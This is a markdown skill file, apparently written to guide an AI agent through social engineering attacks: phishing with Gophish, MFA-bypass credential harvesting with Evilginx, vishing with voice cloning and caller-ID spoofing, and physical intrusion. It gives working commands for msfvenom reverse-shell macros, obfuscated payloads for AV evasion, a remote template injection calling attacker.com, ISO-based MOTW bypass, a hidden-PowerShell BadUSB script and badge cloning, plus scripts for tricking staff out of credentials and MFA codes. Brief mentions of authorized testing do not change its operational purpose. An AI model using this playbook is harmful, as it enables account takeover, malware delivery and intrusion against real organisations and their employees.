---
name: social_engineering
description: Learn phishing campaigns, spear phishing, vishing with AI voice cloning, credential harvesting with Evilginx, payload delivery via SET and document macros, physical social engineering (badge cloning, USB drops), and infrastructure OPSEC.
---
# Social Engineering

## When to Use This Skill

- Planning or executing phishing campaigns against target organizations
- Setting up credential harvesting infrastructure with MFA bypass
- Conducting vishing (voice phishing) assessments
- Preparing payload delivery via documents or USB devices
- Performing physical social engineering (badge cloning, tailgating)
- Building phishing infrastructure with proper OPSEC

---

## Concepts

### Psychology of Influence (Cialdini's Principles)

| Principle | Application |
|-----------|-------------|
| Authority | Impersonate executives, IT, vendors |
| Urgency | "Your account will be suspended" |
| Scarcity | "Limited time offer" |
| Social Proof | "Your colleagues have already completed this" |
| Reciprocity | Offer help before making requests |
| Commitment | Small asks first, then escalate |

### Social Engineering Kill Chain

1. **Reconnaissance** — Target research, employee enumeration, org structure
2. **Weaponization** — Craft pretext, build infrastructure, prepare payloads
3. **Delivery** — Email, phone, physical, or USB vector
4. **Exploitation** — Credential capture, payload execution, or physical access
5. **Installation** — Establish persistence if payload delivered
6. **Actions** — Achieve campaign objectives

---

## Email Phishing

### Campaign Planning

**Target research**:
- LinkedIn for org structure, employee names, email format
- Job postings reveal technologies and internal processes
- Social media for interests, events, recent news
- Hunter.io, theHarvester for email enumeration

**Pretext development**:
- Internal IT notices (password reset, security update)
- HR communications (benefits enrollment, policy updates)
- Finance requests (invoice approval, expense report)
- Vendor impersonation (Microsoft, Salesforce, DocuSign)
- Current events (tax season, COVID policies, layoffs)

### Gophish Setup

**Installation and configuration**:
```bash
# Download from github.com/gophish/gophish/releases
unzip gophish-*.zip && cd gophish
chmod +x gophish
./gophish

# Access admin panel: https://localhost:3333
# Default creds shown on first launch
```

**Sending profile** (SMTP configuration):
```
Name: Corporate Relay
SMTP From: it-security@targetlookalike.com
Host: mail.yourinfra.com:587
Username: relay@yourinfra.com
Password: <smtp_password>
```

**OPSEC customization** — Remove Gophish headers:
```go
// In models/maillog.go, remove X-Gophish headers
// Or use post-deployment header stripping
```

**Email template best practices**:
- Clone legitimate emails from target organization
- Match branding, formatting, signature blocks
- Use HTML editor for pixel-perfect cloning
- Include tracking pixel: `<img src="{{.TrackingURL}}">`
- Link to landing page: `<a href="{{.URL}}">Click here</a>`

**Landing page setup**:
- Clone target login page with wget or HTTrack
- Import HTML into Gophish
- Capture credentials: Enable "Capture Submitted Data" + "Capture Passwords"
- Redirect to real site after capture for stealth

### Spear Phishing

**Personalization techniques**:
```
Subject: Re: Q3 Budget Review - Action Required

Hi {{.FirstName}},

Following up on our discussion about the Q3 budget allocations.
Please review the attached summary and confirm by EOD.

{{.Tracker}}
```

**High-value targets**:
- C-suite executives (whaling)
- Finance team (BEC attacks)
- IT administrators (credential theft)
- HR personnel (employee data access)

### QR Code Phishing (Quishing)

**Attack vector** — QR codes bypass URL scanning:
```bash
# Generate QR code pointing to credential harvester
qrencode -o phish_qr.png 'https://credential-harvester.com/portal'

# Embed in PDF for email attachment
# Or print for physical distribution
```

**Delivery methods**:
- PDF attachments with embedded QR codes
- "Scan to authenticate" pretexts
- Physical QR codes in target locations
- Invoice/parking ticket lures

---

## Credential Harvesting with MFA Bypass

### Evilginx3 (AiTM Phishing)

Adversary-in-the-Middle attack that captures session cookies, bypassing 2FA.

**Setup**:
```bash
# Install
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make

# Run
./bin/evilginx -p ./phishlets

# Configure domain
config domain yourdomain.com
config ipv4 external <your_ip>

# Enable phishlet
phishlets hostname microsoft365 login.yourdomain.com
phishlets enable microsoft365

# Generate lure
lures create microsoft365
lures get-url 0
```

**Phishlet structure** (custom targets):
```yaml
name: 'custom_target'
author: 'operator'
min_ver: '3.0.0'
proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'target.com'
    session: true
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
auth_tokens:
  - domain: '.target.com'
    keys: ['session_id', 'auth_token']
```

**Session replay**:
```bash
# Captured sessions
sessions

# Export cookies for browser import
sessions <id>
# Use Cookie Editor extension to import and access account
```

### Modlishka

Alternative AiTM tool with real-time 2FA interception.

```bash
# Run with configuration
./Modlishka -config config.json

# Config example
{
  "proxyDomain": "phish.yourdomain.com",
  "listeningAddress": "0.0.0.0",
  "target": "targetlogin.com",
  "trackingCookie": "session",
  "jsInjection": "inject.js"
}
```

---

## Vishing (Voice Phishing)

### AI Voice Cloning (2024 Advancement)

**Voice sample acquisition**:
- Public speeches, earnings calls, conference talks
- Social media videos, podcast appearances
- Voicemail greetings

**Tools** (for authorized testing):
- ElevenLabs (commercial, high quality)
- Resemble.AI (custom voice models)
- OpenVoice (open source)
- VALL-E-X (research/open source)

**Real-time voice changing**:
```bash
# During live calls for impersonation
# Tools: Voicemod, MorphVOX Pro
# AI-powered: ElevenLabs real-time, Resemble
```

### Caller ID Spoofing

```bash
# VoIP platforms allow custom caller ID
# SIP-based services: Twilio, Plivo (legitimate use)
# Set caller ID to target's internal number or trusted vendor

# Example with asterisk PBX
# In extensions.conf:
exten => s,1,Set(CALLERID(num)=+1555123456)
```

### Vishing Pretexts

**IT Support**:
```
"This is [Name] from IT Security. We detected unusual login
activity on your account. I need to verify your identity and
walk you through resetting your credentials."
```

**Help Desk Password Reset**:
```
"Hi, I'm calling from the service desk. Your manager [Name]
requested we help you with the VPN issue. Can you verify
your employee ID so I can look up your account?"
```

**Executive Assistant**:
```
"Hi, this is [Name] calling on behalf of [Executive]. They're
in back-to-back meetings and need the updated credentials for
the [System] before the board meeting."
```

### Call Preparation

- Research target's direct reports, recent projects
- Gather internal terminology from job postings, LinkedIn
- Prepare for challenges: "Let me verify that with..."
- Have backup pretexts ready
- Record calls (where legal) for reporting

---

## SMiShing (SMS Phishing)

**Message templates**:
```
[URGENT] Your corporate account has been locked. Verify
your identity: https://short.url/verify

IT Alert: Complete mandatory security training by EOD
or access will be suspended: https://short.url/training
```

**Delivery methods**:
- SMS gateway APIs (Twilio, Vonage)
- Burner phones with prepaid SIMs
- iMessage/RCS for higher trust

**MFA interception**:
```
Your verification code is being sent. For security,
please forward the code to this number to complete
the authentication.
```

---

## Payload Delivery

### Social Engineering Toolkit (SET)

```bash
setoolkit

# Menu navigation:
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner

# Enter target URL and SET clones it
# Credentials captured to /root/.set/reports/
```

**Payload generation**:
```bash
# SET Menu:
1) Social-Engineering Attacks
4) Create a Payload and Listener

# Select payload type (e.g., Windows Reverse TCP Meterpreter)
# SET generates payload and starts listener
```

### Document-Based Payloads

**VBA Macro payload**:
```bash
# Generate with msfvenom
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=443 -f vba -o macro.vba

# Insert into Office document
# File > Options > Customize Ribbon > Developer tab
# Developer > Visual Basic > Insert macro code
```

**MacroPack** (obfuscation + AV bypass):
```bash
# Install
pip install macropack

# Generate obfuscated macro
echo "calc.exe" | macropack -t CMD -G calc.doc

# With meterpreter payload
msfvenom -p windows/meterpreter/reverse_https ... -f vba | macropack -o -G payload.docm
```

**Template injection** (no macro warning):
```
# Create .docx with external template reference
# In word/settings.xml.rels:
<Relationship Type="...attachedTemplate"
  Target="https://attacker.com/template.dotm"
  TargetMode="External"/>

# Remote template contains macro payload
```

### Container-Based Delivery (MOTW Bypass)

**ISO/IMG containers** — Files inside don't inherit Mark-of-the-Web:
```bash
# Create ISO containing payload
mkisofs -o payload.iso -J -R ./payload_folder/

# Contents: LNK file pointing to payload.exe
# When user mounts ISO and runs LNK, no SmartScreen warning
```

**Structure for delivery**:
```
payload.iso
├── Document.lnk        # Opens payload.exe
└── payload.exe         # Hidden, actual malware
```

### USB Attacks

**Rubber Ducky / BadUSB**:
```duckyscript
# DuckyScript payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -e <base64_payload>
ENTER
```

**USB drop campaign**:
- Label drives enticingly: "HR Salaries 2024", "Confidential"
- Include legitimate-looking files alongside payload
- Track which drives are used (unique payloads per drive)

---

## Physical Social Engineering

### Badge Cloning with Proxmark3

**Read HID card**:
```bash
# Low frequency HID ProxCard
proxmark3> lf hid reader
# Outputs card ID

# High frequency (13.56 MHz)
proxmark3> hf search
```

**Clone to T5577**:
```bash
# Clone captured HID credential
proxmark3> lf hid clone -r <card_id>

# Verify clone
proxmark3> lf hid reader
```

**Long-range capture**:
- Modified HID reader with extended antenna (DefCon research)
- Conceal in bag/satchel, target enters elevator
- 2-3 foot range possible with modifications

### Tailgating Techniques

**Props and pretexts**:
- Delivery person (boxes, clipboard)
- IT contractor (laptop bag, badge on lanyard)
- Maintenance worker (tool belt, hi-vis vest)
- Smoker (join employees outside, follow back in)

**Timing**:
- Morning rush (8-9 AM) — People hold doors
- After lunch — Security fatigue
- End of day — People eager to leave

### Dumpster Diving

**Target documents**:
- Organizational charts
- Internal phone directories
- IT disposal (hard drives, access cards)
- Handwritten notes, sticky notes
- Shipping labels (vendor relationships)

---

## Infrastructure OPSEC

### Domain Setup

**Domain selection**:
- Lookalike domains: `target-security.com`, `targetcorp.net`
- Typosquatting: `targ3t.com`, `tarqet.com`
- Homograph attacks: Using similar Unicode characters

**Domain aging**:
```bash
# Register domains 1-2 weeks before campaign
# Build reputation:
# - Set up basic website
# - Send legitimate emails
# - Get categorized (finance, healthcare = less inspection)
```

**DNS configuration**:
```
# SPF record
v=spf1 include:_spf.yourmailprovider.com ~all

# DKIM (generate keys and add to DNS)
# DMARC
_dmarc.yourdomain.com TXT "v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com"
```

### Redirector Architecture

```
[Target] → [Redirector] → [Phishing Server]
              ↓
         [Legitimate Site] (if not target)
```

**Apache mod_rewrite redirector**:
```apache
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} ".*Googlebot.*" [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ".*security.*" [NC]
RewriteRule ^(.*)$ https://legitimate-site.com [L,R=302]

RewriteRule ^(.*)$ https://phishing-backend.com/$1 [P]
```

### SSL Certificates

```bash
# Let's Encrypt for free trusted certs
certbot certonly --standalone -d yourdomain.com

# Certificates automatically trusted in browsers
# Required for Evilginx3 and credential harvesters
```

---

## Email Security Evasion

### SPF/DKIM/DMARC Bypass

**Techniques**:
- Use lookalike domains with valid SPF/DKIM
- Compromise legitimate mail accounts
- Exploit misconfigured DMARC (p=none)
- Header manipulation for display name spoofing

**Display name spoofing**:
```
From: "IT Security <security@company.com>" <attacker@lookalike.com>
# User sees: IT Security <security@company.com>
# Actual sender: attacker@lookalike.com
```

### Payload Evasion

**Link obfuscation**:
```html
<!-- URL shorteners -->
<a href="https://bit.ly/xxx">Click here</a>

<!-- Open redirects -->
<a href="https://google.com/url?q=https://evil.com">Click</a>

<!-- Data URIs (some clients) -->
<a href="data:text/html;base64,PHNjcmlwdD4...">Click</a>
```

**Attachment evasion**:
- Password-protected ZIPs (include password in email body)
- HTML attachments with embedded JavaScript
- ISO/IMG containers (MOTW bypass)
- OneNote files with embedded scripts

---

## Workflows

### Phishing Campaign Workflow

1. **Reconnaissance**:
   ```bash
   theHarvester -d target.com -b linkedin,google
   # Identify email format, key personnel
   ```

2. **Infrastructure setup**:
   - Register lookalike domain (1-2 weeks before)
   - Configure SPF/DKIM/DMARC
   - Set up Gophish or Evilginx3
   - Obtain SSL certificates

3. **Campaign development**:
   - Clone target login page / email templates
   - Create convincing pretext
   - Test with personal accounts first

4. **Execution**:
   - Send in waves (avoid spam filters)
   - Monitor Gophish dashboard for opens/clicks
   - Capture credentials in real-time

5. **Reporting**:
   - Document click rates, credential captures
   - Screenshot evidence
   - Provide remediation recommendations

### Vishing Assessment Workflow

1. **Target selection**:
   - Help desk staff
   - New employees (less security awareness)
   - Specific departments based on objectives

2. **Pretext preparation**:
   - Research internal processes
   - Prepare scripts for different scenarios
   - Set up caller ID spoofing

3. **Execution**:
   - Call during business hours
   - Record calls (with authorization)
   - Document responses and information obtained

4. **Reporting**:
   - Success/failure rates
   - Types of information disclosed
   - Training recommendations

### Physical Social Engineering Workflow

1. **Site reconnaissance**:
   - Entry points, security measures
   - Badge types, employee patterns
   - Camera locations, guard schedules

2. **Equipment preparation**:
   - Proxmark3 for badge cloning
   - Props (uniform, badges, clipboard)
   - Rubber Ducky payloads

3. **Execution**:
   - Time entry for low security periods
   - Document access achieved
   - Photograph evidence

4. **Reporting**:
   - Physical security gaps
   - Employee awareness issues
   - Remediation recommendations
